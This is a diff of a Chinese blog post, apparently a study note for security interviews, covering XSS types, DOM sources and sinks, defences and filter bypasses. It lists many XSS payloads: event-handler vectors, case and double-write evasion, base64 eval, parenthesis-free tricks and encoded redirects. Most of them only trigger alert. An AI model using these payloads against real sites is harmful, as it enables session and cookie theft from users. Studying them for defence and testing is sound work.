@@ -423,7 +423,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-04-03
+                    2020-04-10
                 </div>
                 
 
@@ -453,17 +453,17 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>最近看了看面经，发现XSS和CSRF比较常问的，而目前自己对于这两周漏洞的知识很零碎，就在这周整理总结一下，分两片文章写，这篇是XSS的。XSS的话原理其实挺简单的，但更多的还是一些利用思路和绕过思路，这里总结一些比较常见的。</p>
-<h1 id="0x01-什么是XSS？"><a href="#0x01-什么是XSS？" class="headerlink" title="0x01 什么是XSS？"></a>0x01 什么是XSS？</h1><h2 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1.定义"></a>1.1.定义</h2><p>跨站脚本攻击(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
-<h2 id="1-2原理"><a href="#1-2原理" class="headerlink" title="1.2原理"></a>1.2原理</h2><p>XSS漏洞的原理，就是本来应该是个让用户传送他的数据然后展示的地方，却被恶意用户传入了恶意的信息，且此信息被解析成了程序被执行。<br>程序+数据=结果，而数据当中却被恶意用户插入了程序，导致了漏洞的产生。</p>
-<h2 id="1-3危害"><a href="#1-3危害" class="headerlink" title="1.3危害"></a>1.3危害</h2><p>XSS的危害，常用的就是打cookie了。基于执行的JS代码能实现的操作其实很多，例如，钓鱼，恶意下载……。只要js能实现，都可以。只不过XSS能做打再多，单独的一个XSS是不能危害到服务器的。</p>
-<h2 id="1-4分类"><a href="#1-4分类" class="headerlink" title="1.4分类"></a>1.4分类</h2><p>基本常见的就三类：</p>
+                <h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>最近看了看面经，发现XSS和CSRF比较常问的，而目前自己对于这两周漏洞的知识很零碎，就在这周整理总结一下，分两片文章写，这篇是XSS的。XSS的话原理其实挺简单的，但更多的还是一些利用思路和绕过思路，这里总结一些比较常见的。</p>
+<h2 id="0x01-什么是XSS？"><a href="#0x01-什么是XSS？" class="headerlink" title="0x01 什么是XSS？"></a>0x01 什么是XSS？</h2><h3 id="1-1-定义"><a href="#1-1-定义" class="headerlink" title="1.1.定义"></a>1.1.定义</h3><p>跨站脚本攻击(Cross Site Scripting)，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。</p>
+<h3 id="1-2原理"><a href="#1-2原理" class="headerlink" title="1.2原理"></a>1.2原理</h3><p>XSS漏洞的原理，就是本来应该是个让用户传送他的数据然后展示的地方，却被恶意用户传入了恶意的信息，且此信息被解析成了程序被执行。<br>程序+数据=结果，而数据当中却被恶意用户插入了程序，导致了漏洞的产生。</p>
+<h3 id="1-3危害"><a href="#1-3危害" class="headerlink" title="1.3危害"></a>1.3危害</h3><p>XSS的危害，常用的就是打cookie了。基于执行的JS代码能实现的操作其实很多，例如，钓鱼，恶意下载……。只要js能实现，都可以。只不过XSS能做打再多，单独的一个XSS是不能危害到服务器的。</p>
+<h3 id="1-4分类"><a href="#1-4分类" class="headerlink" title="1.4分类"></a>1.4分类</h3><p>基本常见的就三类：</p>
 <ul>
 <li>反射型</li>
 <li>存储型</li>
 <li>DOM型（对于这个确实了解的不多……）</li>
 </ul>
-<h1 id="0x02-反射型XSS-和-存储型XSS"><a href="#0x02-反射型XSS-和-存储型XSS" class="headerlink" title="0x02 反射型XSS 和 存储型XSS"></a>0x02 反射型XSS 和 存储型XSS</h1><p>这两个都不难理解，就是一个存到数据库了，一个没有。</p>
+<h2 id="0x02-反射型XSS-和-存储型XSS"><a href="#0x02-反射型XSS-和-存储型XSS" class="headerlink" title="0x02 反射型XSS 和 存储型XSS"></a>0x02 反射型XSS 和 存储型XSS</h2><p>这两个都不难理解，就是一个存到数据库了，一个没有。</p>
 <ul>
 <li>反射型XSS，也叫非持久型XSS，是指发生请求时，XSS代码出现在请求URL中，作为参数提交到服务器，服务器解析并响应。响应结果中包含XSS代码，最后浏览器解析并执行 (经过服务器，不经过数据库)<br>反射型漏洞也不单单只存在于url当中，任何形式的数据提交都有可能。但是url中存在更容易用来进行钓鱼等……只要点开就能执行</li>
 <li>存储型XSS，也叫持久型XSS，主要是将XSS代码发送到服务器(不管是数据库、内存还是文件系统等)，然后在下次请求页面的时候就不用带上XSS代码了 (经过服务器，经过数据库)</li>
@@ -486,7 +486,7 @@ $result = mysql_query($sql_insert,$conn);
 $sql_select = &quot;select * from liuyan&quot;;
 $results = mysql_fetch_array(mysql_query($sql_select));
 echo $results[content];
-?&gt;</code></pre><h1 id="0x03-Dom型XSS"><a href="#0x03-Dom型XSS" class="headerlink" title="0x03 Dom型XSS"></a>0x03 Dom型XSS</h1><p>首先的了解什么是<a href="https://www.zhihu.com/question/34219998" target="_blank" rel="noopener">Dom</a>，B乎讲的很全，<br>我的理解就是，对html按照dom树进行格式化，方便浏览器解析。Dom就是一个格式化的模型<br><img src="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/7.png" alt><br>而Dom型xss的产生则是由于对dom操作不当造成的如下面的代码，直接对name进行了输出</p>
+?&gt;</code></pre><h2 id="0x03-Dom型XSS"><a href="#0x03-Dom型XSS" class="headerlink" title="0x03 Dom型XSS"></a>0x03 Dom型XSS</h2><p>首先的了解什么是<a href="https://www.zhihu.com/question/34219998" target="_blank" rel="noopener">Dom</a>，B乎讲的很全，<br>我的理解就是，对html按照dom树进行格式化，方便浏览器解析。Dom就是一个格式化的模型<br><img src="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/7.png" alt><br>而Dom型xss的产生则是由于对dom操作不当造成的如下面的代码，直接对name进行了输出</p>
 <pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span>
     <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>DOM XSS<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>
@@ -499,7 +499,7 @@ echo $results[content];
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span>
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre>
 <p>总结一下，Dom大概就是由于再js进行dom操作的时候所造成的漏洞（基于JS），可能也存在存储类型（前端菜鸡……）。所以我认为XSS只有两类，反射型或者是存储型，又或者是DOM型or非DOM型。</p>
-<h2 id="3-1Dom型XSS常见操作函数"><a href="#3-1Dom型XSS常见操作函数" class="headerlink" title="3.1Dom型XSS常见操作函数"></a>3.1Dom型XSS常见操作函数</h2><p>常见的输入点：</p>
+<h3 id="3-1Dom型XSS常见操作函数"><a href="#3-1Dom型XSS常见操作函数" class="headerlink" title="3.1Dom型XSS常见操作函数"></a>3.1Dom型XSS常见操作函数</h3><p>常见的输入点：</p>
 <pre><code>document.URL
 document.URLUnencoded
 document.location（及其许多属性）
@@ -541,7 +541,7 @@ window.navigate(…)
 document.open(…)
 window.open(…)
 window.location.href=… (and assigning to location’s href, host and hostname)</code></pre><p>以上来自<a href="https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/" target="_blank" rel="noopener">https://www.mi1k7ea.com/2019/06/25/%E6%B5%85%E6%9E%90DOM%E5%9E%8BXSS/</a><br>本人记录一下</p>
-<h1 id="0x04-XSS防御"><a href="#0x04-XSS防御" class="headerlink" title="0x04 XSS防御"></a>0x04 XSS防御</h1><p>这个就贼复杂了……大概总结一下<br>先说一下目前的一些防御机制：</p>
+<h2 id="0x04-XSS防御"><a href="#0x04-XSS防御" class="headerlink" title="0x04 XSS防御"></a>0x04 XSS防御</h2><p>这个就贼复杂了……大概总结一下<br>先说一下目前的一些防御机制：</p>
 <ol>
 <li><strong>HttpOnly</strong>（如果再cookie当中设置这个属性，js脚本将无法读取到cookie信息）</li>
 <li><strong>浏览器内置XSS过滤器</strong></li>
@@ -569,32 +569,32 @@ window.location.href=… (and assigning to location’s href, host and hostname)
 <p>下面摘自<a href="https://juejin.im/post/5bad9140e51d450e935c6d64#heading-24" target="_blank" rel="noopener">https://juejin.im/post/5bad9140e51d450e935c6d64#heading-24</a></p>
 </blockquote>
 <p><img src="/236463394/2.png" alt></p>
-<h1 id="0x05-bypass"><a href="#0x05-bypass" class="headerlink" title="0x05 bypass"></a>0x05 bypass</h1><p>这个绕过就更多了……花里胡哨。先说下完全没过滤的情况下<br>一般输出再标签内，一般就可以试一下是否有xss，如：</p>
+<h2 id="0x05-bypass"><a href="#0x05-bypass" class="headerlink" title="0x05 bypass"></a>0x05 bypass</h2><p>这个绕过就更多了……花里胡哨。先说下完全没过滤的情况下<br>一般输出再标签内，一般就可以试一下是否有xss，如：</p>
 <pre><code>&lt;input value=&quot;输出&quot;&gt;
 &lt;img onload=&quot;...[输出]...&quot;&gt;
 &lt;body style=&quot;...[输出]...&quot;&gt;</code></pre><p>标签之间可以执行也是可以执行的，不能执行的话就要考虑闭合标签</p>
 <pre><code>&lt;div&gt;[输出]&lt;/div&gt;</code></pre><p>下面列一些常见标签，引用自<a href="https://xz.aliyun.com/t/4067#toc-22" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-22</a></p>
-<h2 id="5-1常见标签"><a href="#5-1常见标签" class="headerlink" title="5.1常见标签"></a>5.1常见标签</h2><h3 id="lt-script-gt"><a href="#lt-script-gt" class="headerlink" title="&lt;script&gt;"></a>&lt;script&gt;</h3><pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></pre><h3 id="lt-img-gt"><a href="#lt-img-gt" class="headerlink" title="&lt;img&gt;"></a>&lt;img&gt;</h3><pre><code>&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</code></pre><h3 id="lt-input-gt"><a href="#lt-input-gt" class="headerlink" title="&lt;input&gt;"></a>&lt;input&gt;</h3><pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;
+<h3 id="5-1常见标签"><a href="#5-1常见标签" class="headerlink" title="5.1常见标签"></a>5.1常见标签</h3><h4 id="lt-script-gt"><a href="#lt-script-gt" class="headerlink" title="&lt;script&gt;"></a>&lt;script&gt;</h4><pre><code>&lt;scirpt&gt;alert(&quot;xss&quot;);&lt;/script&gt;</code></pre><h4 id="lt-img-gt"><a href="#lt-img-gt" class="headerlink" title="&lt;img&gt;"></a>&lt;img&gt;</h4><pre><code>&lt;img src=1 onerror=alert(&quot;xss&quot;);&gt;</code></pre><h4 id="lt-input-gt"><a href="#lt-input-gt" class="headerlink" title="&lt;input&gt;"></a>&lt;input&gt;</h4><pre><code>&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot;&gt;
 
 竞争焦点，从而触发onblur事件
 &lt;input onblur=alert(&quot;xss&quot;) autofocus&gt;&lt;input autofocus&gt;
 
 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
-&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;</code></pre><h3 id="lt-details-gt"><a href="#lt-details-gt" class="headerlink" title="&lt;details&gt;"></a>&lt;details&gt;</h3><pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;
+&lt;input onfocus=&quot;alert(&#39;xss&#39;);&quot; autofocus&gt;</code></pre><h4 id="lt-details-gt"><a href="#lt-details-gt" class="headerlink" title="&lt;details&gt;"></a>&lt;details&gt;</h4><pre><code>&lt;details ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;
 使用open属性触发ontoggle事件，无需用户去触发
-&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code></pre><h3 id="lt-svg-gt"><a href="#lt-svg-gt" class="headerlink" title="&lt;svg&gt;"></a>&lt;svg&gt;</h3><pre><code>&lt;svg onload=alert(&quot;xss&quot;);&gt;</code></pre><h3 id="lt-select-gt"><a href="#lt-select-gt" class="headerlink" title="&lt;select&gt;"></a>&lt;select&gt;</h3><pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;
+&lt;details open ontoggle=&quot;alert(&#39;xss&#39;);&quot;&gt;</code></pre><h4 id="lt-svg-gt"><a href="#lt-svg-gt" class="headerlink" title="&lt;svg&gt;"></a>&lt;svg&gt;</h4><pre><code>&lt;svg onload=alert(&quot;xss&quot;);&gt;</code></pre><h4 id="lt-select-gt"><a href="#lt-select-gt" class="headerlink" title="&lt;select&gt;"></a>&lt;select&gt;</h4><pre><code>&lt;select onfocus=alert(1)&gt;&lt;/select&gt;
 
 通过autofocus属性执行本身的focus事件，这个向量是使焦点自动跳到输入元素上,触发焦点事件，无需用户去触发
-&lt;select onfocus=alert(1) autofocus&gt;</code></pre><h3 id="lt-iframe-gt"><a href="#lt-iframe-gt" class="headerlink" title="&lt;iframe&gt;"></a>&lt;iframe&gt;</h3><pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</code></pre><h3 id="lt-video-gt"><a href="#lt-video-gt" class="headerlink" title="&lt;video&gt;"></a>&lt;video&gt;</h3><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code></pre><h3 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="&lt;audio&gt;"></a>&lt;audio&gt;</h3><pre><code>&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</code></pre><h3 id="lt-body-gt"><a href="#lt-body-gt" class="headerlink" title="&lt;body&gt;"></a>&lt;body&gt;</h3><pre><code>&lt;body/onload=alert(&quot;xss&quot;);&gt;</code></pre><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p>
+&lt;select onfocus=alert(1) autofocus&gt;</code></pre><h4 id="lt-iframe-gt"><a href="#lt-iframe-gt" class="headerlink" title="&lt;iframe&gt;"></a>&lt;iframe&gt;</h4><pre><code>&lt;iframe onload=alert(&quot;xss&quot;);&gt;&lt;/iframe&gt;</code></pre><h4 id="lt-video-gt"><a href="#lt-video-gt" class="headerlink" title="&lt;video&gt;"></a>&lt;video&gt;</h4><pre><code>&lt;video&gt;&lt;source onerror=&quot;alert(1)&quot;&gt;</code></pre><h4 id="lt-audio-gt"><a href="#lt-audio-gt" class="headerlink" title="&lt;audio&gt;"></a>&lt;audio&gt;</h4><pre><code>&lt;audio src=x  onerror=alert(&quot;xss&quot;);&gt;</code></pre><h4 id="lt-body-gt"><a href="#lt-body-gt" class="headerlink" title="&lt;body&gt;"></a>&lt;body&gt;</h4><pre><code>&lt;body/onload=alert(&quot;xss&quot;);&gt;</code></pre><p>利用换行符以及autofocus，自动去触发onscroll事件，无需用户去触发</p>
 <pre><code>&lt;body
-onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre><h3 id="lt-textarea-gt"><a href="#lt-textarea-gt" class="headerlink" title="&lt;textarea&gt;"></a>&lt;textarea&gt;</h3><pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code></pre><h3 id="lt-keygen-gt"><a href="#lt-keygen-gt" class="headerlink" title="&lt;keygen&gt;"></a>&lt;keygen&gt;</h3><pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre><h3 id="lt-marquee-gt"><a href="#lt-marquee-gt" class="headerlink" title="&lt;marquee&gt;"></a>&lt;marquee&gt;</h3><pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre><h3 id="lt-isindex-gt"><a href="#lt-isindex-gt" class="headerlink" title="&lt;isindex&gt;"></a>&lt;isindex&gt;</h3><pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code></pre><h3 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h3><p>PS：在无CSP的情况下才可以</p>
-<pre><code>&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code></pre><h3 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h3><h4 id="lt-a-gt"><a href="#lt-a-gt" class="headerlink" title="&lt;a&gt;"></a>&lt;a&gt;</h4><pre><code>&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;</code></pre><h4 id="lt-iframe-gt-1"><a href="#lt-iframe-gt-1" class="headerlink" title="&lt;iframe&gt;"></a>&lt;iframe&gt;</h4><pre><code>&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;</code></pre><h4 id="lt-img-gt-1"><a href="#lt-img-gt-1" class="headerlink" title="&lt;img&gt;"></a>&lt;img&gt;</h4><pre><code>&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下</code></pre><h4 id="lt-form-gt"><a href="#lt-form-gt" class="headerlink" title="&lt;form&gt;"></a>&lt;form&gt;</h4><pre><code>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></pre><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>expression属性</p>
+onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;input autofocus&gt;</code></pre><h4 id="lt-textarea-gt"><a href="#lt-textarea-gt" class="headerlink" title="&lt;textarea&gt;"></a>&lt;textarea&gt;</h4><pre><code>&lt;textarea onfocus=alert(&quot;xss&quot;); autofocus&gt;</code></pre><h4 id="lt-keygen-gt"><a href="#lt-keygen-gt" class="headerlink" title="&lt;keygen&gt;"></a>&lt;keygen&gt;</h4><pre><code>&lt;keygen autofocus onfocus=alert(1)&gt; //仅限火狐</code></pre><h4 id="lt-marquee-gt"><a href="#lt-marquee-gt" class="headerlink" title="&lt;marquee&gt;"></a>&lt;marquee&gt;</h4><pre><code>&lt;marquee onstart=alert(&quot;xss&quot;)&gt;&lt;/marquee&gt; //Chrome不行，火狐和IE都可以</code></pre><h4 id="lt-isindex-gt"><a href="#lt-isindex-gt" class="headerlink" title="&lt;isindex&gt;"></a>&lt;isindex&gt;</h4><pre><code>&lt;isindex type=image src=1 onerror=alert(&quot;xss&quot;)&gt;//仅限于IE</code></pre><h4 id="利用link远程包含js文件"><a href="#利用link远程包含js文件" class="headerlink" title="利用link远程包含js文件"></a>利用link远程包含js文件</h4><p>PS：在无CSP的情况下才可以</p>
+<pre><code>&lt;link rel=import href=&quot;http://127.0.0.1/1.js&quot;&gt;</code></pre><h4 id="javascript伪协议"><a href="#javascript伪协议" class="headerlink" title="javascript伪协议"></a>javascript伪协议</h4><h5 id="lt-a-gt"><a href="#lt-a-gt" class="headerlink" title="&lt;a&gt;"></a>&lt;a&gt;</h5><pre><code>&lt;a href=&quot;javascript:alert(`xss`);&quot;&gt;xss&lt;/a&gt;</code></pre><h5 id="lt-iframe-gt-1"><a href="#lt-iframe-gt-1" class="headerlink" title="&lt;iframe&gt;"></a>&lt;iframe&gt;</h5><pre><code>&lt;iframe src=javascript:alert(&#39;xss&#39;);&gt;&lt;/iframe&gt;</code></pre><h5 id="lt-img-gt-1"><a href="#lt-img-gt-1" class="headerlink" title="&lt;img&gt;"></a>&lt;img&gt;</h5><pre><code>&lt;img src=javascript:alert(&#39;xss&#39;)&gt;//IE7以下</code></pre><h5 id="lt-form-gt"><a href="#lt-form-gt" class="headerlink" title="&lt;form&gt;"></a>&lt;form&gt;</h5><pre><code>&lt;form action=&quot;Javascript:alert(1)&quot;&gt;&lt;input type=submit&gt;</code></pre><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>expression属性</p>
 <pre><code>&lt;img style=&quot;xss:expression(alert(&#39;xss&#39;&#39;))&quot;&gt; // IE7以下
 &lt;div style=&quot;color:rgb(&#39;&#39;�x:expression(alert(1))&quot;&gt;&lt;/div&gt; //IE7以下
 &lt;style&gt;#test{x:expression(alert(/XSS/))}&lt;/style&gt; // IE7以下</code></pre><p>background属性</p>
-<pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code></pre><h2 id="5-2根据情况的bypass"><a href="#5-2根据情况的bypass" class="headerlink" title="5.2根据情况的bypass"></a>5.2根据情况的bypass</h2><h3 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h3><p>用<code>/</code>代替空格</p>
+<pre><code>&lt;table background=javascript:alert(1)&gt;&lt;/table&gt; //在Opera 10.5和IE6上有效</code></pre><h3 id="5-2根据情况的bypass"><a href="#5-2根据情况的bypass" class="headerlink" title="5.2根据情况的bypass"></a>5.2根据情况的bypass</h3><h4 id="过滤空格"><a href="#过滤空格" class="headerlink" title="过滤空格"></a>过滤空格</h4><p>用<code>/</code>代替空格</p>
 <pre class=" language-html"><code class="language-html">&lt;img/src="x"/onerror=alert("xss");></code></pre>
-<h3 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h3><p><strong>大小写绕过</strong>：</p>
+<h4 id="过滤关键字"><a href="#过滤关键字" class="headerlink" title="过滤关键字"></a>过滤关键字</h4><p><strong>大小写绕过</strong>：</p>
 <pre class=" language-html"><code class="language-html">&lt;ImG sRc=x onerRor=alert("xss");></code></pre>
 <p><strong>双写绕过</strong>：<br>有些waf可能会只替换一次且是替换为空，这种情况下我们可以考虑双写关键字绕过</p>
 <pre class=" language-html"><code class="language-html">&lt;imimgg srsrcc=x onerror=alert("xss");></code></pre>
@@ -642,12 +642,12 @@ onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;
 <pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>eval(atob(<span class="token punctuation">'</span>ZG9jdW1lbnQubG9jYXRpb249J2h0dHA6Ly93d3cuYmFpZHUuY29tJw<span class="token punctuation">=</span><span class="token punctuation">=</span><span class="token punctuation">'</span>))<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
 
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>iframe</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4<span class="token punctuation">=</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre>
-<h3 id="过滤单引号、双引号"><a href="#过滤单引号、双引号" class="headerlink" title="过滤单引号、双引号"></a>过滤单引号、双引号</h3><ol>
+<h4 id="过滤单引号、双引号"><a href="#过滤单引号、双引号" class="headerlink" title="过滤单引号、双引号"></a>过滤单引号、双引号</h4><ol>
 <li>如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号<pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>x<span class="token punctuation">"</span></span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert(`xss`);</span><span class="token punctuation">></span></span></code></pre>
 </li>
 <li>使用编码绕过，</li>
 </ol>
-<h3 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h3><ol>
+<h4 id="过滤括号"><a href="#过滤括号" class="headerlink" title="过滤括号"></a>过滤括号</h4><ol>
 <li><p>当括号被过滤的时候可以使用throw来绕过</p>
 <pre class=" language-html"><code class="language-html">&lt;svg/onload="window.onerror=eval;throw'=alert\x281\x29';"></code></pre>
 </li>
@@ -660,7 +660,7 @@ onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;
 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>x</span> <span class="token attr-name">onerror</span><span class="token attr-value"><span class="token punctuation">=</span>alert`1`</span><span class="token punctuation">></span></span></code></pre>
 </li>
 </ol>
-<h3 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h3><ol>
+<h4 id="过滤url地址"><a href="#过滤url地址" class="headerlink" title="过滤url地址"></a>过滤url地址</h4><ol>
 <li><p>url编码</p>
 <pre class=" language-html"><code class="language-html">&lt;img src="x" onerror=document.location=`http://%77%77%77%2e%62%61%69%64%75%2e%63%6f%6d/`></code></pre>
 </li>
@@ -674,8 +674,8 @@ onscroll=alert(&quot;xss&quot;);&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;
 </li>
 </ol>
 <p>以上参考自<a href="https://xz.aliyun.com/t/4067#toc-27" target="_blank" rel="noopener">https://xz.aliyun.com/t/4067#toc-27</a> </p>
-<h1 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h1><p>XSS知识有点零碎，涉及的比较多，这里我就稍作了解吧，以后遇到解决不了的再深入，一些其他东西会放到PS里面，然后用思维导图整理下</p>
-<h1 id="0x07-PS"><a href="#0x07-PS" class="headerlink" title="0x07 PS"></a>0x07 PS</h1><h2 id="on事件"><a href="#on事件" class="headerlink" title="on事件"></a>on事件</h2><pre><code>onload
+<h2 id="0x06-总结"><a href="#0x06-总结" class="headerlink" title="0x06 总结"></a>0x06 总结</h2><p>XSS知识有点零碎，涉及的比较多，这里我就稍作了解吧，以后遇到解决不了的再深入，一些其他东西会放到PS里面，然后用思维导图整理下</p>
+<h2 id="0x07-PS"><a href="#0x07-PS" class="headerlink" title="0x07 PS"></a>0x07 PS</h2><h3 id="on事件"><a href="#on事件" class="headerlink" title="on事件"></a>on事件</h3><pre><code>onload
 onclick
 onunload
 onchange
@@ -696,7 +696,7 @@ onmouseup
 onforminput
 onformchange
 ondrag
-ondrop</code></pre><h2 id="可以执行JS的标签"><a href="#可以执行JS的标签" class="headerlink" title="可以执行JS的标签"></a>可以执行JS的标签</h2><pre><code>&lt;script&gt; 
+ondrop</code></pre><h3 id="可以执行JS的标签"><a href="#可以执行JS的标签" class="headerlink" title="可以执行JS的标签"></a>可以执行JS的标签</h3><pre><code>&lt;script&gt; 
 &lt;a&gt; 
 &lt;p&gt; 
 &lt;img&gt;
@@ -715,19 +715,19 @@ ondrop</code></pre><h2 id="可以执行JS的标签"><a href="#可以执行JS的�
 &lt;svg&gt; 
 &lt;math&gt; 
 &lt;video&gt; 
-&lt;audio&gt;</code></pre><h2 id="可以执行js的属性"><a href="#可以执行js的属性" class="headerlink" title="可以执行js的属性"></a>可以执行js的属性</h2><pre><code>formaction
+&lt;audio&gt;</code></pre><h3 id="可以执行js的属性"><a href="#可以执行js的属性" class="headerlink" title="可以执行js的属性"></a>可以执行js的属性</h3><pre><code>formaction
 action
 href
 xlink:href
 autofocus
 src
 content
-data</code></pre><h2 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h2><p><img src="https://raw.githubusercontent.com/j0k3r-z/images/master/img/20200403143705.png" alt></p>
-<h2 id="备忘录"><a href="#备忘录" class="headerlink" title="备忘录"></a>备忘录</h2><p>收藏一下，当字典用</p>
